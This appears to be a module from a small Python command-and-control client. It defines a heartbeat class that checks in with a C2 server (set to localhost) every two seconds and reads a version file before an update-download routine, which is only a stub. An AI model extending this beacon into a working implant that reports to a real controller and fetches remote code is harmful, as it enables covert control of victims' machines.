import os
import requests

from .common import IntervalExecutable


class HeartbeatModule(IntervalExecutable):
    """Send a heartbeat back to C2"""

    interval = 2

    C2_DOMAIN = "http://localhost:8000"
    VERSION_FILE = "version.txt"

    @staticmethod
    def execute() -> None:
        response = requests.post(url=HeartbeatModule.C2_DOMAIN + "/heartbeat")

        if response.status_code != 200:
            print("Error:", response.content)

        if not os.path.exists(HeartbeatModule.VERSION_FILE):
            HeartbeatModule.download_updates(-1)
            return

        with open(HeartbeatModule.VERSION_FILE, "r") as f:
            version = f.read()

        HeartbeatModule.download_updates(int(version))

    @staticmethod
    def download_updates(latest_version: int) -> None:
        print(f"Downloading since v{latest_version}...")
